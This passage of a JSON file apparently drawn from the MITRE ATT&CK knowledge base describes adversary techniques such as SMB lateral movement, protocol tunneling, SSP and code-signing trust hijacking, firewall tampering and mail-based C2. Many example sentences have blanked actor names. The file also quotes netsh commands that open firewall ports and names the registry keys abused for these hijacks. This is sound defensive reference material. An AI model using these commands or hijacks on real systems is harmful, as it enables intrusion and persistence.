      "used SMB file shares to distribute payloads throughout victim networks including BlackByte ransomware variants during wormable operations.",
      "has transferred tools within victim environments using SMB.",
      "uses mapped shared folders to transfer ransomware payloads via SMB.",
      "has the ability to tunnel SMB sessions.",
      "During   leveraged SMB to transfer files and move laterally.",
      "can use SMB for lateral movement.",
      "has attempted to move laterally in victim environments via SMB using ."
    ],
    "description": "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)",
    "similar_words": [
      "SMB/Windows Admin Shares"
    ],
    "id": "T1021.002"
  },
  "attack-pattern--4fd8a28b-4b3a-4cd6-a8cf-85ba5f824a7f": {
    "name": "Implant Internal Image",
    "example_uses": [],
    "description": "Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victims environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)A tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)",
    "similar_words": [
      "Implant Internal Image"
    ],
    "id": "T1525"
  },
  "attack-pattern--4fe28b27-b13c-453e-a386-c2ef362a573b": {
    "name": "Protocol Tunneling",
    "example_uses": [
      "During   used SSH tunneling in targeted environments.",
      "has utilized web shells and Java tools for tunneling capabilities to and from compromised assets.",
      "During the  campaign  used encrypted SSH-based PLINK tunnels to transfer tools and enable RDP connections throughout the environment.",
      "can use spoofed DNS requests to create a bidirectional tunnel between a compromised host and its C2 servers.",
      "has used Plink to tunnel RDP over SSH.",
      "used the Plink command-line utility to create SSH tunnels to C2 servers.",
      "uses a custom command and control protocol that communicates over commonly used ports and is frequently encapsulated by application layer protocols.",
      "can connect to HTTP proxies via TCP to create a tunnel to C2.",
      "can use a custom protocol tunneled through DNS or HTTP.",
      "attempts to perform an HTTP CONNECT via an internal proxy to establish a tunnel.",
      "During the   deployed the GOGETTER tunneler software to establish a Yamux TLS-based C2 channel with an external server(s).",
      "can use DNS over HTTPS for C2.",
      "has encapsulated 's C2 protocol in DNS and HTTPS.",
      "can use a custom protocol tunneled through DNS or HTTP.",
      "During  threat actors used Iodine to tunnel IPv4 traffic over DNS.",
      "has the ability to communicate over custom communications methodologies that ride over common network protocols including raw TCP and UDP sockets HTTP SMTP and DNS.",
      "has used the Plink utility and other tools to create tunnels to C2 servers.",
      "uses a custom command and control protocol that is encapsulated in HTTP HTTPS or DNS. In addition it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.",
      "has used protocol tunneling for communication and RDP activity on compromised hosts through the use of open source tools such as  and custom tool SSHMinion.",
      "has used the Plink utility to create SSH tunnels.",
      "has used the Iox and NPS proxy and tunneling tools in combination create multiple connections through a single tunnel.",
      "can tunnel RDP and other services securely over internet connections.",
      "can use SOCKS proxies to tunnel traffic through another protocol.",
      "During  the threat actors set up remote SSH tunneling into the victim's environment from a malicious domain.",
      "uses RDP to tunnel traffic from a victim environment.",
      "The  proxy module can encapsulate SOCKS5 protocol within its own proxy protocol.",
      "can use DNS over HTTPS (DoH) to resolve C2 nodes.",
      "has used protocol tunneling to further conceal C2 communications and infrastructure.",
      "can run a custom binary protocol under HTTPS for C2.",
      "has used ProxyChains to tunnel protocols to internal networks.",
      "can tunnel SSH and Unix Domain Socket communications over TCP between external nodes and exposed resources behind firewalls or NAT.",
      "can tunnel data in and out of targeted networks.",
      "has modified device configurations to create and use Generic Routing Encapsulation (GRE) tunnels.",
      "can tunnel TCP sessions including RDP SSH and SMB through HTTP."
    ],
    "description": "Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another. This behavior may conceal malicious traffic by blending in with existing traffic and/or provide an outer layer of encryption (similar to a VPN). Tunneling could also enable routing of network packets that would otherwise not reach their intended destination, such as SMB, RDP, or other traffic that would be filtered by network appliances or not routed over the Internet. There are various means to encapsulate a protocol within another protocol. For example, adversaries may perform SSH tunneling (also known as SSH port forwarding), which involves forwarding arbitrary data over an encrypted SSH tunnel.(Citation: SSH Tunneling)(Citation: Sygnia Abyss Locker 2025) [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) may also be abused by adversaries during [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). Known as DNS over HTTPS (DoH), queries to resolve C2 infrastructure may be encapsulated within encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) Adversaries may also leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) in conjunction with [Proxy](https://attack.mitre.org/techniques/T1090) and/or [Protocol or Service Impersonation](https://attack.mitre.org/techniques/T1001/003) to further conceal C2 communications and infrastructure. ",
    "similar_words": [
      "Protocol Tunneling"
    ],
    "id": "T1572"
  },
  "attack-pattern--4ff5d6a8-c062-4c68-a778-36fc5edd564f": {
    "name": "Control Panel",
    "example_uses": [
      "has used control panel files (CPL) delivered via e-mail for execution.",
      "can register itself for execution and persistence via the Control Panel.",
      "drops and executes a malicious CPL file as its payload."
    ],
    "description": "Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a CPlApplet function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)Malicious Control Panel items can be delivered via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.Adversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Control Panel\\Cpls. Even when these registered DLLs do not comply with the CPL file specification and do not export CPlApplet functions, they are loaded and executed through its DllEntryPoint when Control Panel is executed. CPL files not exporting CPlApplet are not directly executable.(Citation: ESET InvisiMole June 2020)",
    "similar_words": [
      "Control Panel"
    ],
    "id": "T1218.002"
  },
  "attack-pattern--4ffc1794-ec3b-45be-9e52-42dbcb2af2de": {
    "name": "Network Address Translation Traversal",
    "example_uses": [],
    "description": "Adversaries may bridge network boundaries by modifying a network devices Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device.  A typical example of this is environments where internal networks make use of non-Internet routable addresses.(Citation: RFC1918)When an adversary gains control of a network boundary device, they can either leverage existing NAT configurations to send traffic between two separated networks, or they can implement NAT configurations of their own design.  In the case of network designs that require NAT to function, this enables the adversary to overcome inherent routing limitations that would normally prevent them from accessing protected systems behind the border device.  In the case of network designs that do not require NAT, address translation can be used by adversaries to obscure their activities, as changing the addresses of packets that traverse a network boundary device can make monitoring data transmissions more challenging for defenders.  Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to change the operating system of a network device, implementing their own custom NAT mechanisms to further obscure their activities",
    "similar_words": [
      "Network Address Translation Traversal"
    ],
    "id": "T1599.001"
  },
  "attack-pattern--506f6f49-7045-4156-9007-7474cb44ad6d": {
    "name": "Upload Tool",
    "example_uses": [
      "For   used multiple servers to host malicious tools.",
      "For  UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system.",
      "has staged tools including  and WCE on previously compromised websites."
    ],
    "description": "Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.Tools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",
    "similar_words": [
      "Upload Tool"
    ],
    "id": "T1608.002"
  },
  "attack-pattern--5095a853-299c-4876-abd7-ac0050fb5462": {
    "name": "Security Support Provider",
    "example_uses": [
      "The  credential dumper contains an implementation of an SSP.",
      "can enumerate Security Support Providers (SSPs) as well as utilize 's Install-SSP and Invoke-Mimikatz to install malicious SSPs and log authentication events.",
      "Install-SSP Persistence module can be used to establish by installing a SSP DLL."
    ],
    "description": "Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA) process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs.The SSP configuration is stored in two Registry keys: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)",
    "similar_words": [
      "Security Support Provider"
    ],
    "id": "T1547.005"
  },
  "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814": {
    "name": "Use Alternate Authentication Material",
    "example_uses": [
      "During the   used forged SAML tokens that allowed the actors to impersonate users and bypass MFA enabling  to access enterprise cloud applications and services.",
      "can allow abuse of a compromised AD FS server's SAML token."
    ],
    "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the systemeither in memory or on diskit may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",
    "similar_words": [
      "Use Alternate Authentication Material"
    ],
    "id": "T1550"
  },
  "attack-pattern--51e54974-a541-4fb6-a61b-0518e4c6de41": {
    "name": "Threat Intel Vendors",
    "example_uses": [],
    "description": "Adversaries may search private data from threat intelligence vendors for information that can be used during targeting. Threat intelligence vendors may offer paid feeds or portals that offer more data than what is publicly reported. Although sensitive details (such as customer names and other identifiers) may be redacted, this information may contain trends regarding breaches such as target industries, attribution claims, and successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds)Adversaries may search in private threat intelligence vendor data to gather actionable information. Threat actors may seek information/indicators gathered about their own campaigns, as well as those conducted by other adversaries that may align with their target industries, capabilities/objectives, or other operational concerns. Information reported by vendors may also reveal opportunities other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
    "similar_words": [
      "Threat Intel Vendors"
    ],
    "id": "T1597.001"
  },
  "attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd": {
    "name": "Network Device Configuration Dump",
    "example_uses": [
      "has attempted to acquire credentials by dumping network device configurations."
    ],
    "description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.Adversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",
    "similar_words": [
      "Network Device Configuration Dump"
    ],
    "id": "T1602.002"
  },
  "attack-pattern--5282dd9a-d26d-4e16-88b7-7c0f4553daf4": {
    "name": "Gather Victim Identity Information",
    "example_uses": [
      "has gathered detailed information of target employees to enhance their social engineering lures.",
      "has identified specific potential victims at targeted organizations.",
      "has researched employees to target for social engineering attacks.",
      "For   conducted extensive reconnaissance research on potential targets.",
      "has conducted targeted surveillance against activists and bloggers.",
      "During  threat actors targeted people based on their organizational roles and privileges.",
      "has acquired mobile phone numbers of potential targets possibly for mobile malware or additional phishing operations.",
      "has identified ways to engage targets by researching potential victims' interests and social or professional contacts.",
      "has gathered victim identify information during pre-compromise reconnaissance."
    ],
    "description": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse 2023) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
    "similar_words": [
      "Gather Victim Identity Information"
    ],
    "id": "T1589"
  },
  "attack-pattern--5372c5fe-f424-4def-bcd5-d3a8e770f07b": {
    "name": "Disable or Modify System Firewall",
    "example_uses": [
      "has a command to disable routing and the Firewall on the victims machine.",
      "may use  to add local firewall rule exceptions.",
      "can modify the victim's firewall.",
      "disables the Windows firewall before binding to a port.",
      "used scripts which killed processes and added firewall rules to block traffic related to other cryptominers.",
      "has disabled iptables.",
      "kills and disables services for Windows Firewall.",
      "can open the Windows Firewall on the victims machine to allow incoming connections.",
      "has disabled host-based firewalls. The group has also globally opened port 3389.",
      "can be used to disable local firewall settings.",
      "has modified firewall rules to allow incoming SMB NetBIOS and RPC connections using `netsh.exe` on remote machines.",
      "can modify the Linux iptables firewall to enable C2 communication on network devices via a stored list of port numbers.",
      "has used batch scripts that can disable the Windows firewall on specific remote machines.",
      "has modified the Windows firewall to allow itself to communicate through the firewall.",
      "can block the Deibold Warsaw GAS Tecnologia security tool at the firewall level.",
      "can add or remove applications or ports on the Windows firewall or disable it entirely.",
      "Prior to executing a backdoor  has run `cmd /c start /b netsh advfirewall firewall add rule name=SGAccessInboundRule dir=in protocol=udp action=allow localport=49683` to allow the targeted system to receive UDP packets on port 49683.",
      "can disable the firewall by modifying the registry key HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile.",
      "can disable Security Center functions like the Windows Firewall.",
      "has checked for the presence of Little Snitch macOS network monitoring and application firewall software stopping and exiting if it is found.",
      "has added the following rule to a victim's Windows firewall to allow RDP traffic - `netsh advfirewall firewall add rule name=Terminal Server dir=in action=allow protocol=TCP localport=3389`.",
      "During  threat actors used PowerShell to add and delete rules in the Windows firewall.",
      "Various  malware modifies the Windows firewall to allow incoming connections or disable it entirely using .",
      "have created firewall exemptions on specific ports including ports 443 6443 8443 and 9443.",
      "has been observed disabling the system firewall.",
      "has modified the firewall using .",
      "opens the Windows Firewall to modify incoming connections.",
      "The ZR variant of  will check to see if known host-based firewalls are installed on the infected systems.  will attempt to establish a C2 channel then will examine open windows to identify a pop-up from the firewall software and will simulate a mouse-click to allow the connection to proceed.",
      "has the ability to change firewall settings to allow a plug-in to be downloaded.",
      "During the   used `netsh` to configure firewall rules that limited certain UDP outbound packets.",
      "starts a shell on a high TCP port starting at 42391 up to 43391 then changes the local `iptables` rules to redirect all packets from the attacker to the shell port.",
      "can modify local firewall settings via `netsh` commands to open a listening UDP port.",
      "has made changes to the Access Control List (ACL) and loopback interface address on compromised devices.",
      "modifies the Windows firewall during execution.",
      "turns on the system firewall and deletes all of its rules during execution.",
      "During   added rules to a victim's Windows firewall to set up a series of port-forwards allowing traffic to target systems.",
      "has modified local firewall rules on victim machines to enable a random high-number listening port for subsequent access and C2 activity.",
      "has modified Windows firewall rules to enable remote access.",
      "modified system firewalls to add two open listening ports on 9998 and 9999 during .",
      "modified system firewall settings during  installation using `netsh.exe` to open a listening random high number port on victim devices.",
      "modified firewall rules on victim machines to enable remote system discovery."
    ],
    "description": "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)Adversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules.In ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., via `esxcli network firewall set`) or via the vCenter user interface.(Citation: Trellix Rnasomhouse 2024)(Citation: Broadcom ESXi Firewall)",
    "similar_words": [
      "Disable or Modify System Firewall"
    ],
    "id": "T1562.004"
  },
  "attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a": {
    "name": "Archive Collected Data",
    "example_uses": [
      "has compressed data into .zip files prior to exfiltration.",
      "can encrypt and store on disk collected data before exfiltration.",
      "encrypted the collected files' path with AES and then encoded them with base64.",
      "has been observed encrypting the data it collects before sending it to the C2 server.",
      "automatically encrypts files before sending them to the C2 server.",
      "has used FileReadZipSend to compress a file and send to C2.",
      "has compressed and encrypted data prior to exfiltration.",
      "can collect files into password-protected ZIP-archives for exfiltration.",
      "can compress data collected by its SharpHound ingestor into a ZIP file to be written to disk.",
      "encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.",
      "can ZIP directories on the target system.",
      "can compress data stolen from the Registry and volume shadow copies prior to exfiltration.",
      "can archive files on the compromised host.",
      "has compressed exfiltrated data with RAR and used RomeoDelta malware to archive specified directories in .zip format encrypt the .zip file and upload it to C2.",
      "has the ability to compress stolen data into a .cab file.",
      "contains a function to encrypt and store emails that it collects.",
      "used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.",
      "encrypts the collected files using 3-DES.",
      "used LZ compression to compress initial reconnaissance reports before sending to the C2.",
      "backdoor has used LZMA compression and RC4 encryption before exfiltration.",
      "will compress entire ~/Desktop folders excluding all .git folders but only if the total data size is under 200MB.",
      "encrypts data using Base64 before being sent to the command and control server.",
      "has encrypted data and files prior to exfiltration.",
      "has the ability to compress archived screenshots.",
      "can encrypt browser database files prior to exfiltration.",
      "encrypts collected data using a public key framework before sending it over the C2 channel. Some variants encrypt the collected data with AES and encode it with base64 before transmitting it to the C2 server.",
      "can RC4-encrypt credentials before sending to the C2.",
      "has used a method similar to RC4 as well as AES for encryption and hexadecimal for encoding data before exfiltration.",
      "Following data collection  has compressed log files into a ZIP archive prior to staging and exfiltration.",
      "can compress data before sending it.",
      "has compressed collected data before exfiltration.",
      "has manually archived stolen files from victim machines before exfiltration.",
      "writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.",
      "can zip files before exfiltration.",
      "encrypts collected data with AES and Base64 and then sends it to the C2 server.",
      "The  group has been known to compress data before exfiltration.",
      "encrypts and adds all gathered browser data into files for upload to C2.",
      "contains code to compress files.",
      "stores zipped files with profile data from installed web browsers.",
      "can encrypt data with 3DES before sending it over to a C2 server.",
      "packs collected data into a password protected archive.",
      "has encrypted files and information before exfiltration.",
      "hides collected data in password-protected .rar archives.",
      "has archived victim's data prior to exfiltration.",
      "zips up files before exfiltrating them.",
      "has encrypted stolen credit card information with AES and further encoded it with Base64.",
      "has used ZIP to compress data gathered on a compromised host.",
      "After collecting documents from removable media  compresses the collected files and encrypts it with Blowfish.",
      "has encrypted data before sending it to the server.",
      "has compressed collected data prior to exfiltration.",
      "can archive collected documents for exfiltration.",
      "archives collected system information in a text f ile `System info.txt` prior to exfiltration.",
      "compressed data collected from victim environments prior to exfiltration.",
      "compresses stolen data prior to exfiltration.",
      "can compress and encrypt exfiltrated packet captures from targeted devices."
    ],
    "description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.(Citation: DOJ GRU Indictment Jul 2018) Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
    "similar_words": [
      "Archive Collected Data"
    ],
    "id": "T1560"
  },
  "attack-pattern--543fceb5-cb92-40cb-aacf-6913d4db58bc": {
    "name": "SIP and Trust Provider Hijacking",
    "example_uses": [],
    "description": "Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function,  (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017)Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all  (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017)Similar to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017)* Modifying the Dll and FuncName Registry values in HKLM\\SOFTWARE[\\WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllGetSignedDataMsg\\{SIP_GUID} that point to the dynamic link library (DLL) providing a SIPs CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the files real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).* Modifying the Dll and FuncName Registry values in HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllVerifyIndirectData\\{SIP_GUID} that point to the DLL providing a SIPs CryptSIPDllVerifyIndirectData function, which validates a files computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.* Modifying the DLL and Function Registry values in HKLM\\SOFTWARE\\[WOW6432Node\\]Microsoft\\Cryptography\\Providers\\Trust\\FinalPolicy\\{trust provider GUID} that point to the DLL providing a trust providers FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIPs CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).* **Note:** The above hijacks are also possible without modifying the Registry via [DLL](https://attack.mitre.org/techniques/T1574/001) search order hijacking.Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",
    "similar_words": [
      "SIP and Trust Provider Hijacking"
    ],
    "id": "T1553.003"
  },
  "attack-pattern--54b4c251-1f0e-4eba-ba6b-dbc7a6f6f06b": {
    "name": "Mail Protocols",
    "example_uses": [
      "can use email attachments for command and control.",
      "uses SMTP for C2.",
      "can communicate over SMTP and POP3 for C2.",
      "uses SMTP for C2.",
      "Various implementations of  communicate with C2 over SMTP and POP3.",
      "has used multiple backdoors which communicate with a C2 server via email attachments.",
      "can use custom communications protocols that ride over SMTP.",
      "can send email over SMTP.",
      "is capable of using SMTP for C2.",
      "uses the email platform Naver for C2 communications leveraging SMTP.",
      "uses SMTP for C2 communications.",
      "uses SMTP/S and POP3/S for C2 communications by sending and receiving emails.",
      "uses SMTP and POP3 for C2.",
      "can use SMTP for C2.",
      "has used email for C2 via an Office macro.",
      "can use email attachments for C2 communications.",
      "can use emails for C2 communications.",
      "has used IMAP POP3 and SMTP for a communication channel in various implants including using self-registered Google Mail accounts and later compromised email servers of its victims.",
      "has used e-mail to send exfiltrated data to C2 servers.",
      "has used SMTP for C2 communications.",
      "has the ability to use a Microsoft Outlook backdoor macro to communicate with its C2.",
      "A  variant used SMTP for C2.",
      "uses the IMAP email protocol for command and control purposes.",
      "can communicates with C2 using email messages via the Outlook Messaging API (MAPI).",
      "can receive and send back the results of executed C2 commands through email."
    ],
    "description": "Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: FireEye APT28) ",
    "similar_words": [
      "Mail Protocols"
    ],
    "id": "T1071.003"
  },
  "attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f": {
    "name": "Hybrid Identity",
    "example_uses": [
